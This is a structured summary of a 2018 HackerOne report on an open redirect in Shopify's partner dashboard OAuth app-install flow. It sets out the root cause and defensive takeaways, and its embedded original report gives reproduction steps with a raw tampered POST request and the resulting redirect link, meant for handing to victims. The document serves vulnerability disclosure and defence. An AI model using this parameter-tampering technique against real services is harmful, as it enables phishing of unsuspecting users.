# Open Redirection in Shopify OAuth Flow via Unvalidated Store Parameter

## Metadata
- **Source:** HackerOne
- **Report:** 405697 | https://hackerone.com/reports/405697
- **Submitted:** 2018-09-05
- **Reporter:** dr_dragon
- **Program:** Shopify
- **Bounty:** Not specified in report
- **Severity:** medium
- **Vuln:** open_redirection, insufficient_input_validation, oauth_flow_manipulation
- **CVEs:** None
- **Category:** auth-crypto

## Summary
Shopify's partner dashboard failed to validate the 'install_app[Select a store]' parameter when installing apps on development stores, allowing attackers to redirect users to arbitrary Shopify stores during the OAuth flow. An unauthenticated attacker could craft a malicious link that redirects victims to attacker-controlled stores, enabling phishing and credential harvesting attacks.

## Attack scenario
1. Attacker logs into their Shopify partner account and creates a test app
2. Attacker initiates the 'test your app' flow targeting their own development store
3. Attacker intercepts the POST request to /apps/{app_id}/install_on_dev_shop using a proxy
4. Attacker modifies the 'install_app[Select a store]' parameter from their legitimate store to a malicious store (attacker-controlled or lookalike domain)
5. Attacker obtains the redirect URL containing the OAuth redirect that points to the malicious store's OAuth endpoint
6. Attacker sends the crafted link to victims, who are redirected to the attacker-controlled store during OAuth, exposing them to credential theft or malware

## Root cause
The server-side validation of the store selection parameter was insufficient or absent. The application failed to verify that the selected store belonged to the authenticated user or was in their authorized list before constructing the redirect response, allowing arbitrary store domains to be injected into the OAuth redirect chain.

## Attacker mindset
An attacker with partner access could leverage this to create convincing phishing attacks by redirecting legitimate OAuth flows to malicious stores. The attacker could impersonate a legitimate store installation process, harvesting credentials or injecting malware. The attack is particularly effective because the redirect originates from Shopify's trusted domain.

## Defensive takeaways
- Implement strict whitelist validation for all user-controlled parameters used in redirects, especially in OAuth flows
- Verify that any store parameter belongs to the authenticated user's authorized store list before using it in URL construction
- Use server-side session state to validate that the requested store matches the one initiated in the original request
- Implement CSRF tokens that are tied to specific store selections to prevent parameter tampering
- Perform domain validation on redirect targets and reject requests to domains outside the expected OAuth endpoint pattern
- Log and alert on suspicious store selection mismatches between request initiation and redirect parameters
- Consider using opaque tokens or state parameters that cannot be manipulated by users

## Variant hunting
Check other Shopify OAuth flows (app installation, billing, scopes) for similar parameter injection vulnerabilities
Test partner dashboard endpoints that redirect to merchant stores for similar unvalidated parameters
Examine any user-controlled parameters in POST/GET requests that influence redirect Location headers
Review other Shopify products (Point of Sale, Fulfillment, etc.) for similar OAuth flow validation issues
Test for open redirections in other dev store selection mechanisms or store switching functionality
Investigate whether the signature parameter can be forged or whether it validates store ownership

## MITRE ATT&CK
- T1598.003
- T1566.002
- T1187

## Notes
The vulnerability is particularly dangerous in OAuth contexts because users expect to be redirected during authentication flows, making them less likely to scrutinize the destination domain. The use of Shopify's trusted domain for the initial redirect adds legitimacy to the attack. The report lacks specific bounty amount and timeline details, but the issue demonstrates a critical gap in OAuth parameter validation that could affect multiple Shopify products.

## Full report
<details><summary>Expand</summary>

#steps to reproduce:
1-Open your shopify partner account.
2-Create an app and click on test your app.
3-Select a development store you own.
4-Intercept the request using burpsuite and change the "install_app[Select a store]" parameter to any store  with no validation.

The request like this:
```
POST /526915/apps/2544979/install_on_dev_shop HTTP/1.1
Host: partners.shopify.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://partners.shopify.com/526915/apps/2544979
Content-Type: application/x-www-form-urlencoded
Content-Length: 187
Cookie: last_shop=mido-2.myshopify.com; optimizelyEndUserId=oeu1536089316039r0.9037032785131875; _y=a60f12ee-9E2A-4EB5-93DA-34EC09FA1A95; _shopify_y=a60f12ee-9E2A-4EB5-93DA-34EC09FA1A95; _shopify_fs=2018-09-04T19%3A28%3A36.510Z; _ga=GA1.2.a60f12ee-9E2A-4EB5-93DA-34EC09FA1A95; _gid=GA1.2.352493204.1536089321; _ceg.s=pek3q2; _ceg.u=pek3q2; __hstc=138892268.672c096176060d98d2c72b786b0c0116.1536089327774.1536094057487.1536106976076.3; hubspotutk=672c096176060d98d2c72b786b0c0116; __utma=262205262.672852694.1536089354.1536089354.1536096223.2; __utmz=262205262.1536096223.2.2.utmcsr=partners.shopify.com|utmccn=(referral)|utmcmd=referral|utmcct=/; master_device_id=6b415960-b260-4a0a-a281-5c9b4be57c37; __hssrc=1; _partners_session=6cc122023cd45fc2becb197861cfd156; __utmc=262205262; __hssc=138892268.1.1536106976076
Connection: keep-alive
Upgrade-Insecure-Requests: 1

utf8=%E2%9C%93&authenticity_token=dO84UJSGLnRDTF3yLennlB1esNOx0SxdN0WJSGY8e%2F%2FquALL%2BQSBxb%2ByPgiyxRtoS8aCgQ83x33JxPAmrbHYdA%3D%3D&install_app%5BSelect+a+store%5D=$$.myshopify.com
```

The response like this :
```
HTTP/1.1 302 Found
Server: nginx/1.15.2
Date: Wed, 05 Sep 2018 01:01:51 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: strict-origin-when-cross-origin
Location: https://$$.myshopify.com/admin/oauth/redirect_from_partners_dashboard?client_id=04d42319b01049853db0281e6e68b0ea&signature=eyJleHBpcmVzX2F0IjoxNTM2MTA5NjExLCJwZXJtYW5lbnRfZG9tYWluIjoibWlkby0yLm15c2hvcGlmeS5jb20iLCJjbGllbnRfaWQiOiIwNGQ0MjMxOWIwMTA0OTg1M2RiMDI4MWU2ZTY4YjBlYSJ9--6b2892e6e4e0d4eea6ffad3ff5683f3aac2b61bb
X-Robots-Tag: none
Cache-Control: no-cache
X-Request-Id: e4c2d9e3a7f47203a309afb03f731b38
X-Runtime: 0.368401
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Dc: gke
X-Dc: gke
Content-Length: 391

<html><body>You are being <a href="https://$$.myshopify.com/admin/oauth/redirect_from_partners_dashboard?client_id=04d42319b01049853db0281e6e68b0ea&amp;signature=eyJleHBpcmVzX2F0IjoxNTM2MTA5NjExLCJwZXJtYW5lbnRfZG9tYWluIjoibWlkby0yLm15c2hvcGlmeS5jb20iLCJjbGllbnRfaWQiOiIwNGQ0MjMxOWIwMTA0OTg1M2RiMDI4MWU2ZTY4YjBlYSJ9--6b2892e6e4e0d4eea6ffad3ff5683f3aac2b61bb">redirected</a></body></html>
```
5-Copy this link between <a> tages and give it to the victim.
6-The victim will redirect :).

## Impact

Attacker can phish users.

</details>

---
*Analysed by Claude on 2026-05-24*
